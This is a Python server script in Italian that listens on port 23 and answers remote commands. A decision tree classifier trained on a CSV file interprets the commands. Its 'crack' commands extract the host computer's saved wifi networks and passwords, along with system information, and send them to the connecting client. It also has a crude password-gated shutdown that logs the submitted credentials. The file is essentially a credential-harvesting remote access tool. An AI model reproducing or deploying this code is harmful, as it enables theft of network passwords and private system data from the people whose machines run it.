print("Server in fase di Avvio. . .")

import socket
import os
import Tool
import pandas as pd
from sklearn.tree import DecisionTreeClassifier
from Tool.createJson import createJson
from Tool.gui import IPAddr, ToolGUI


credenziali = []
data_copia = []

stacchetto = "=================================================="
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_ip = IPAddr
server_port = 23

info_server = (server_ip, server_port)

server_socket.bind(info_server)
server_socket.listen(1)

print("Server Avviato!\nIP: {}\nPorta: {}\n\n".format(*info_server))
# print("Connessione stabilita con {}:{}".format(client_address[0], client_address[1]))
df = pd.read_csv('Dati.csv')


def sendmessage(message):
    client_socket.send(str(message).encode())


def takeWeb():
    webs = {}
    extractor = Tool.extractor(arr_wifi=[], arr_pass=[], dict_rete=webs)
    reti = extractor.extractWeb()
    risposta = "Ecco le Informazioni Estratte da questo PC: \n{}".format(reti)
    return risposta


def takeInfo():
    createJson("Informazioni")
    file = open("Informazioni.json", "r")
    contenuto = file.read()
    file.close()
    os.remove("Informazioni.json")
    risposta = "Ecco le Informazioni Estratte da questo PC: \n{}".format(contenuto)
    return risposta


def writeWebs(file_name):
    name = file_name
    createJson(name)


def openGUI():
    gui = ToolGUI()

    return "Gui Aperta"


def RichiestaArrestaServer():
    return "Nel prossimo messaggio inserisci, il nome e la password\n\npython Client.py -username (nome utente) -password (password)"


def helpComandi():
    comandi = """Ecco la lista dei comandi:
    crack -(arg): 
    \t-web or -wifi: Preleva le reti del computer;
    \t-info: Preleva le Informazioni del Computer;
    
    gui -(arg):
    \t-o: Apri la GUI 
    
    write -(arg) "(nome file)":
    \t-web: Salva le informazioni del Computer su un file JSON;
    
    (ADMIN)
    server -(arg):
    \t-d: Arresta il Server
    \t-help: Mostra questa lista
    """
    return comandi

risposte = {

    "tookWebs": takeWeb(),
    "tookINFO": takeInfo(),
    "OPEN-GUI": openGUI(),
    "SERVER-DOWN": RichiestaArrestaServer(),
    "COMM-HELP": helpComandi(),
    "ACCESSO-CONS": "arrestaServer",
    "writeWebs": "writeWebs",

}



while True:
    client_socket, client_address = server_socket.accept()
    print("==================================================")
    print("Dati inviati da: [{}:{}]".format(*client_address))
    data = client_socket.recv(1024).decode()
    data = data.split(" ")
    # print(data)

    if (len(data) >= 3) and ("write" in data) and ("-web" in data):
        arg2 = data[2:]
        data = data[:2]
        print("Dati ricevuti dal client: {}, {}".format(data, arg2))
        print('Risposta del Server: Crezione del file "{}.json"'.format(" ".join(arg2)))
        print(stacchetto, end="\n")

    elif (len(data) == 4) and ("-username" in data) and ("-password" in data):
        for args in data:
            data_copia.append(args)

        username = data[:2]
        username.remove("-username")
        password = data[2:4]
        password.remove("-password")
        # print(username, password)
        credenziali.append("".join(username))
        credenziali.append("".join(password))
        print("Dati ricevuti dal client: {}".format(data))
        data = credenziali
        # print(data)
    else:
        print("Dati ricevuti dal client: {}".format(data))
    try:
        X = df[data]
    except KeyError:
        if ("-username" in data_copia) and ("-password" in data_copia):
            sendmessage("Username o Password Errata!")
            print('Username: "{}"\nPassword: "{}"'.format(credenziali[0], credenziali[1]))
            print("Il server stato cercato di essere arrestato da: {}:{}".format(*client_address))
            print("==================================================\n")
            data_copia.clear()
            credenziali.clear()
        else:
            sendmessage("""Inserisci bene l'argomento. Se vuoi un aiuto con i comandi utilizza gli argomenti "server -d" """)
            print("Risposta del Server: None\n==================================================\n")
            continue

    except ValueError:
        break

    y = df["RISPOSTA"]
    try:
        model = DecisionTreeClassifier()
        model.fit(X.values, y.values)
        prev = model.predict([[1, 1]])
        prev = " ".join(prev)
        # print(prev)
    except NameError:
        continue

    except ValueError:
        df.fillna(0)
        continue

    risp = risposte.get(prev)
    # print(risp)
    if risp is None:
        pass
    else:
        if risp == "writeWebs":
            try:
                filename = " ".join(arg2)
                writeWebs(filename)
                sendmessage("File creato con successo!")
            except NameError:
                sendmessage("Inserisci il nome del File!")
                print("Errore")

        elif risp == "arrestaServer":
            sendmessage("✓ Accesso Consentito!\nSto arrestando il Server")
            print("Server Arrestato da: {}:{}".format(*client_address))
            print("==================================================")
            exit()


        else:
            print('Risposta del Server: / \n"{}"'.format(risp))
            print("==================================================", end="\n")
            sendmessage(risp)


client_socket.close()
server_socket.close()
